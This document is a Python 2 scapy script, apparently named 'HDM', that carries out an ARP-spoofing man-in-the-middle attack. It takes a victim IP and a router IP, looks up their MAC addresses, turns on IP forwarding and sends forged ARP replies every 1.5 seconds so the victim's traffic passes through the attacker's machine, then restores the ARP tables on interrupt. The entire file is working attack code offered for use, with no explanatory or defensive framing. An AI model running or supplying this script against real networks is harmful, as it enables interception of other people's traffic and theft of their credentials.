#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # supress warnins
from scapy.all import * # then import
logging.getLogger("scapy.runtime").setLevel(1) # then restore them
import argparse
import signal
import sys
import time

def myExit(status):
    print " > HDM exit"
    exit(status)

def parse_args():
    help_message = "Usage: ./hdm.py -v V -r R [-h]\n where :\n V is victim IP\n R is router IP"
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-v", "--victimIP")
    parser.add_argument("-r", "--routerIP")
    parser.add_argument("-h", "--help", action="store_true")
    if parser.parse_args().help:
        print help_message
        exit(0)
    if not parser.parse_args().victimIP:
        print " > victim IP not specified | use -h for more info"
        exit(0)
    if not parser.parse_args().routerIP:
        print " > router IP not specified | use -h for more info"
        exit(0)
    return parser.parse_args()

def originalMAC(ip):
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
    for s,r in ans:
        return r.sprintf("%Ether.src%")

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)

def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=0)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3, verbose=0)
    print ""
    print " > network defaults restored"
    sys.exit(" > HDM exit")

def main(args):
    print " > HDM start"
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")
    routerIP = args.routerIP
    victimIP = args.victimIP
    print "routerIP:", routerIP
    print "victimIP:", victimIP
    routerMAC = originalMAC(args.routerIP)
    victimMAC = originalMAC(args.victimIP)
    print "routerMAC:", routerMAC
    print "victimMAC:", victimMAC
    if routerMAC == None:
        print "Could not find router MAC address."
        sys.exit(" > HDM exit")
    if victimMAC == None:
        print "Could not find victim MAC address."
        sys.exit(" > HDM exit")
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')
    def signal_handler(signal, frame):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('0\n')
        restore(routerIP, victimIP, routerMAC, victimMAC)
    signal.signal(signal.SIGINT, signal_handler)
    print " > poisoning in progress"
    while 1:
        poison(routerIP, victimIP, routerMAC, victimMAC)
        time.sleep(1.5)
main(parse_args())
